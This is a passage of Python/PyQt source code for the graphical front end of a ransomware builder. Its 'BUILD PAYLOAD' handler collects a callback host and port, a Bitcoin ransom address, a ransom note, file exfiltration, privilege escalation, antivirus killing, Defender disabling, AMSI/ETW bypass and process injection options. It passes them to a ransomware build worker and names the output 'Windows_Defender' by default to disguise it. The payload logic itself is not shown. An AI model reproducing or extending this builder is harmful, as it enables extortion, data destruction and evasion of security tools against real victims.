                    stop:0 #1a0000, stop:0.5 #0a0a0a, stop:1 #1a0000);
                border: 1px solid #ff0000;
                border-radius: 6px;
                padding: 6px;
            }
        """)
        build_section_layout = QHBoxLayout(build_section)
        build_section_layout.setContentsMargins(10, 8, 10, 8)
        build_section_layout.setSpacing(10)

        build_label = QLabel("🚀")
        build_label.setStyleSheet("font-size: 20pt;")
        build_section_layout.addWidget(build_label)

        self.build_btn = QPushButton("BUILD PAYLOAD")
        self.build_btn.setMinimumHeight(45)
        self.build_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ff0000, stop:0.5 #cc0000, stop:1 #ff0000);
                color: white;
                font-weight: bold;
                font-size: 13pt;
                padding: 8px 40px;
                border: 2px solid #ff4444;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ff3333, stop:0.5 #ff0000, stop:1 #ff3333);
                border-color: #ff8888;
            }
            QPushButton:pressed {
                background: #880000;
            }
            QPushButton:disabled {
                background: #333333;
                color: #666666;
                border-color: #444444;
            }
        """)
        self.build_btn.clicked.connect(self._generate)
        build_section_layout.addWidget(self.build_btn, 2)

        self.stop_btn = QPushButton("⏹ STOP")
        self.stop_btn.setMinimumHeight(45)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background: #555555;
                color: white;
                font-weight: bold;
                font-size: 11pt;
                padding: 6px 20px;
                border: 2px solid #777777;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #777777;
                border-color: #999999;
            }
            QPushButton:disabled {
                background: #222222;
                color: #444444;
                border-color: #333333;
            }
        """)
        self.stop_btn.clicked.connect(self._stop_generation)
        self.stop_btn.setEnabled(False)
        build_section_layout.addWidget(self.stop_btn)

        build_section_layout.addStretch()

        self.copy_btn = QPushButton("📋 Copy")
        self.copy_btn.setMinimumHeight(35)
        self.copy_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                padding: 4px 14px;
                border: none;
                border-radius: 4px;
                font-size: 10pt;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.copy_btn.clicked.connect(self._copy_output)
        build_section_layout.addWidget(self.copy_btn)

        self.save_btn = QPushButton("💾 Save")
        self.save_btn.setMinimumHeight(35)
        self.save_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                font-weight: bold;
                padding: 4px 14px;
                border: none;
                border-radius: 4px;
                font-size: 10pt;
            }
            QPushButton:hover { background: #2ea043; }
        """)
        self.save_btn.clicked.connect(self._save_output)
        build_section_layout.addWidget(self.save_btn)

        self.open_folder_btn = QPushButton("📂 Open")
        self.open_folder_btn.setMinimumHeight(35)
        self.open_folder_btn.setStyleSheet("""
            QPushButton {
                background: #da3633;
                color: white;
                font-weight: bold;
                padding: 4px 14px;
                border: none;
                border-radius: 4px;
                font-size: 10pt;
            }
            QPushButton:hover { background: #f85149; }
        """)
        self.open_folder_btn.clicked.connect(self._open_output_folder)
        build_section_layout.addWidget(self.open_folder_btn)

        layout.addWidget(build_section)

        # ── Decryption Key ──
        key_label = QLabel("🔑 Decryption Key:")
        key_label.setStyleSheet("font-weight: bold; color: #ffff00; font-size: 11pt;")
        layout.addWidget(key_label)

        self.key_display = QTextEdit()
        self.key_display.setReadOnly(True)
        self.key_display.setMaximumHeight(50)
        self.key_display.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #00ff00;
                border: 2px solid #00ff00;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 13pt;
                font-weight: bold;
            }
        """)
        self.key_display.setPlainText("⏳ Waiting for build...")
        layout.addWidget(self.key_display)

        # ── Generated Payload ──
        payload_label = QLabel("💾 Generated Payload:")
        payload_label.setStyleSheet("font-weight: bold; color: #ffff00; font-size: 11pt;")
        layout.addWidget(payload_label)

        self.payload_text = QTextEdit()
        self.payload_text.setReadOnly(True)
        self.payload_text.setFont(QFont("Consolas", 8))
        self.payload_text.setMinimumHeight(120)
        self.payload_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 8pt;
            }
        """)
        layout.addWidget(self.payload_text)

        return panel

    # ─── Helper Methods ────────────────────────────────────────────────────

    def _apply_defaults(self):
        self.lhost_input.setText("127.0.0.1")
        self.lport_input.setText("4444")
        self.output_path_input.setText(self.output_dir)
        self.file_name_input.setText("Windows_Defender")
        self.encryption_combo.setCurrentText("xchacha20")
        self.obfuscation_combo.setCurrentIndex(0)
        self.reconnect_combo.setCurrentText("2")

    def _toggle_av_kill(self, enabled):
        self.av_process_kill_cb.setEnabled(enabled)
        self.av_service_disable_cb.setEnabled(enabled)
        self.av_registry_tamper_cb.setEnabled(enabled)
        self.av_driver_unload_cb.setEnabled(enabled)
        self.av_defender_disable_cb.setEnabled(enabled)
        self.wmi_event_subscribe_cb.setEnabled(enabled)

    def _toggle_av_bypass(self, enabled):
        self.amsi_bypass_cb.setEnabled(enabled)
        self.etw_bypass_cb.setEnabled(enabled)
        self.dll_unhook_cb.setEnabled(enabled)
        self.syscall_direct_cb.setEnabled(enabled)
        self.process_injection_cb.setEnabled(enabled)
        self.reflective_pe_cb.setEnabled(enabled)
        self.obfuscation_combo.setEnabled(enabled)

    def _on_format_changed(self, format_name):
        if "EXE" in format_name:
            self._update_exe_status()
            self.icon_path_input.setEnabled(True)
            self.icon_browse_btn.setEnabled(True)
            self.target_os_combo.setEnabled(True)
            self.format_status.setText("🔨 EXE - Building with PyInstaller")
            self.format_status.setStyleSheet("color: #ffaa00; font-size: 9pt; padding: 2px;")
        else:
            self.format_status.setText("✅ Python - runs with python3")
            self.format_status.setStyleSheet("color: #50fa7b; font-size: 9pt; padding: 2px;")
            self.icon_path_input.setEnabled(False)
            self.icon_browse_btn.setEnabled(False)
            self.target_os_combo.setEnabled(False)

    def _update_exe_status(self):
        if "EXE" in self.format_combo.currentText():
            target_os = self.target_os_combo.currentText()
            os_display = {
                "windows": "Windows (.exe)",
                "linux": "Linux (no extension)",
                "macos": "macOS (.app bundle)"
            }
            file_name = self.file_name_input.text().strip() or "Windows_Defender"
            self.format_status.setText(f"🔨 {os_display.get(target_os, 'EXE')} → {file_name}")
            self.format_status.setStyleSheet("color: #ffaa00; font-size: 9pt; padding: 2px;")

    def _browse_output_folder(self):
        folder = QFileDialog.getExistingDirectory(
            self,
            "Select Output Directory",
            self.output_path_input.text() or str(Path.home())
        )
        if folder:
            self.output_path_input.setText(folder)

    def _browse_icon(self):
        filepath, _ = QFileDialog.getOpenFileName(
            self,
            "Select Icon File",
            str(Path.home()),
            "Icon Files (*.ico *.png *.jpg *.jpeg);;All Files (*.*)"
        )
        if filepath:
            self.icon_path_input.setText(filepath)

    def _generate(self):
        """Generate ransomware payload"""
        lhost = self.lhost_input.text().strip()
        if not lhost:
            QMessageBox.warning(self, "Error", "Please enter LHOST")
            return

        lport = self.lport_input.text().strip()
        if not lport:
            QMessageBox.warning(self, "Error", "Please enter LPORT")
            return

        try:
            lport_int = int(lport)
            if not (1 <= lport_int <= 65535):
                raise ValueError
        except ValueError:
            QMessageBox.warning(self, "Error", "Invalid LPORT (1-65535)")
            return

        output_dir = self.output_path_input.text().strip()
        if not output_dir:
            output_dir = self.output_dir

        try:
            os.makedirs(output_dir, exist_ok=True)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Cannot create directory:\n{e}")
            return

        file_name = self.file_name_input.text().strip()
        if not file_name:
            file_name = "Windows_Defender"

        format_map = {"Python (.py)": "python", "EXE": "exe"}
        format_type = format_map.get(self.format_combo.currentText(), "python")

        options = {
            "LHOST": lhost,
            "LPORT": lport_int,
            "ENCRYPTION": self.encryption_combo.currentText(),
            "EXTENSIONS": self.extensions_input.text().strip(),
            "BTC_ADDRESS": self.btc_input.text().strip(),
            "RANSOM_NOTE": self.note_input.toPlainText().strip() or "YOUR FILES ARE ENCRYPTED!",
            "WALLPAPER": self.wallpaper_cb.isChecked(),
            "GUI_MODE": self.gui_cb.isChecked(),
            "EXFILTRATE_FILES": self.exfiltrate_cb.isChecked(),
            "PARALLEL_ENCRYPTION": self.parallel_cb.isChecked(),
            "PRIVILEGE_ESCALATION": self.priv_esc_cb.isChecked(),
            "DLL_SIDELOADING": self.dll_sideloading_cb.isChecked(),
            "BYOVD": self.byovd_cb.isChecked(),
            "DESKTOP_ICON_CHANGE": self.desktop_icon_cb.isChecked(),
            "AV_KILL": self.av_kill_cb.isChecked(),
            "AV_PROCESS_KILL": self.av_process_kill_cb.isChecked(),
            "AV_SERVICE_DISABLE": self.av_service_disable_cb.isChecked(),
            "AV_REGISTRY_TAMPER": self.av_registry_tamper_cb.isChecked(),
            "AV_DRIVER_UNLOAD": self.av_driver_unload_cb.isChecked(),
            "AV_DEFENDER_DISABLE": self.av_defender_disable_cb.isChecked(),
            "WMI_EVENT_SUBSCRIBE": self.wmi_event_subscribe_cb.isChecked(),
            "AV_BYPASS": self.av_bypass_cb.isChecked(),
            "AMSI_BYPASS": self.amsi_bypass_cb.isChecked(),
            "ETW_BYPASS": self.etw_bypass_cb.isChecked(),
            "DLL_UNHOOKING": self.dll_unhook_cb.isChecked(),
            "SYSCALL_DIRECT": self.syscall_direct_cb.isChecked(),
            "PROCESS_INJECTION": self.process_injection_cb.isChecked(),
            "REFLECTIVE_PE": self.reflective_pe_cb.isChecked(),
            "OBFUSCATION_LEVEL": self.obfuscation_combo.currentIndex(),
            "MAX_RECONNECT_ATTEMPTS": int(self.reconnect_combo.currentText()),
            "OUTPUT_FORMAT": format_type,
            "FULL_FILENAME": file_name,
            "ICON_PATH": self.icon_path_input.text().strip(),
            "TARGET_OS": self.target_os_combo.currentText(),
            "COUNTDOWN_SECONDS": self.countdown_spin.value(),
            "MAX_FILE_SIZE_MB": self.max_size_spin.value(),
            "THREAD_COUNT": self.thread_spin.value(),
            "DECRYPT_KEY": self.decrypt_key_input.text().strip(),
        }

        # Disable build button, enable stop
        self.build_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_indicator.setText("● Building...")
        self.status_indicator.setStyleSheet("color: #ffff00; font-size: 11pt; font-weight: bold;")
        self.progress_bar.setValue(0)
        self.output_text.clear()
        self.payload_text.clear()
        self.key_display.setPlainText("⏳ Generating...")
        self.key_display.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #ffff00;
                border: 2px solid #ffff00;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 13pt;
                font-weight: bold;
            }
        """)

        features = []
        if options["AV_KILL"]:
            features.append("☠ AV Kill (15+)")
        if options["AV_BYPASS"]:
            features.append("🛡️ Bypass (12+)")
        if options["AMSI_BYPASS"]:
            features.append("🔓 AMSI")
        if options["ETW_BYPASS"]:
            features.append("🔓 ETW")
        if options["PROCESS_INJECTION"]:
            features.append("💉 Process Inject")
        if options["DLL_SIDELOADING"]:
            features.append("📦 DLL Side-Load")
        if options["BYOVD"]:
            features.append("🔓 BYOVD")
        if options["DESKTOP_ICON_CHANGE"]:
            features.append("🖼️ Icon Change")
        
        self.features_status.setText("⚡ " + " | ".join(features))

        self.worker = RansomwareBuildWorker(options, output_dir)
        self.worker.output.connect(self._append_output)
        self.worker.progress.connect(self.progress_bar.setValue)
        self.worker.finished.connect(self._on_finished)
        self.worker.key_generated.connect(self._on_key_generated)
        self.worker.start()

    def _stop_generation(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker.wait(1000)
            self._append_output("[!] Stopped by user")

        self.build_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_indicator.setText("● Stopped")
        self.status_indicator.setStyleSheet("color: #ff5555; font-size: 11pt; font-weight: bold;")

    def _append_output(self, text):
        self.output_text.append(text)
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def _on_key_generated(self, key):
        self.current_key = key
        self.key_display.setPlainText(f"🔑 {key}")
        self.key_display.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #00ff00;
                border: 2px solid #00ff00;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 13pt;
                font-weight: bold;
            }
        """)

    def _on_finished(self, success, result, output_type):
        self.build_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

        if success:
            self.status_indicator.setText("● Completed")
            self.status_indicator.setStyleSheet("color: #50fa7b; font-size: 11pt; font-weight: bold;")
            self._append_output(f"[+] Success! {output_type}")
            
            # Load payload into generated payload text area
            try:
                with open(result, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if len(content) > 5000:
                        content = content[:5000] + "\n\n... (truncated)"
                    self.payload_text.setPlainText(content)
                    self._append_output(f"[+] Payload loaded into Generated Payload area")
            except Exception as e:
                self.payload_text.setPlainText(f"✅ Payload saved to:\n{result}")
                self._append_output(f"[!] Could not load payload preview: {e}")
            
            self.progress_bar.setValue(100)
            
            QMessageBox.information(
                self, "Success",
                f"{output_type} generated!\n\n"
                f"Location: {result}\n"
                f"Decryption Key: {self.current_key if self.current_key else 'Saved in file'}"
            )
        else:
            self.status_indicator.setText("● Failed")
            self.status_indicator.setStyleSheet("color: #ff5555; font-size: 11pt; font-weight: bold;")
            self._append_output(f"[!] Failed: {result}")
            self.key_display.setPlainText("❌ Failed")
            self.key_display.setStyleSheet("""
                QTextEdit {
                    background: #0d1117;
                    color: #ff5555;
                    border: 2px solid #ff5555;
                    border-radius: 4px;
                    padding: 6px;
                    font-family: 'Consolas', monospace;
                    font-size: 13pt;
                    font-weight: bold;
                }
            """)
            QMessageBox.critical(self, "Error", f"Generation failed:\n{result}")

    def _copy_output(self):
        text = self.payload_text.toPlainText()
        if text and "No payload generated" not in text:
            QApplication.clipboard().setText(text)
            self._append_output("[+] Copied to clipboard!")
        else:
            QMessageBox.information(self, "Info", "No payload to copy. Build a payload first.")

    def _save_output(self):
        text = self.payload_text.toPlainText()
        if not text or "No payload generated" in text:
            QMessageBox.information(self, "Info", "No payload to save. Build a payload first.")
            return
        
        filepath, _ = QFileDialog.getSaveFileName(
            self,
            "Save Payload",
            str(Path.home() / "ransomware_payload.txt"),
            "Python Files (*.py);;Text Files (*.txt);;All Files (*.*)"
        )
        if filepath:
            try:
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(text)
                self._append_output(f"[+] Saved to: {filepath}")
                QMessageBox.information(self, "Saved", f"Payload saved to:\n{filepath}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save:\n{e}")

    def _open_output_folder(self):
        folder = self.output_path_input.text().strip()
        if not folder:
            folder = self.output_dir

        if os.path.exists(folder):
            if os.name == 'nt':
                os.startfile(folder)
            else:
                subprocess.Popen(['xdg-open', folder])
        else:
            QMessageBox.warning(self, "Warning", f"Folder not found:\n{folder}")

    def closeEvent(self, event):
        self._stop_generation()
        event.accept()

    # ─── Styling ──────────────────────────────────────────────────────────

    @staticmethod
    def _group_style(color="#00ff00"):
        return f"""
            QGroupBox {{
                color: {color};
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 4px;
                padding-top: 8px;
                font-weight: bold;
                font-size: 10pt;
                background: #0a0a0a;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 8px;
                color: {color};
                background: #0a0a0a;
            }}
        """

    @staticmethod
    def _input_style():
        return """
            QLineEdit, QSpinBox {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 4px 10px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QLineEdit:focus, QSpinBox:focus { border-color: #007acc; }
            QLineEdit:disabled, QSpinBox:disabled { color: #555555; background: #1a1a1a; }
        """

    @staticmethod
    def _combo_style():
        return """
            QComboBox {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 4px 10px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QComboBox:hover { border-color: #007acc; }
            QComboBox::drop-down { border: none; }
            QComboBox QAbstractItemView {
                background: #0d1117;
                color: #e6edf3;
                selection-background-color: #1f6feb;
            }
            QComboBox:disabled { color: #555555; background: #1a1a1a; }
        """

    @staticmethod
    def _textarea_style():
        return """
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QTextEdit:focus { border-color: #007acc; }
            QTextEdit:disabled { color: #555555; background: #1a1a1a; }
        """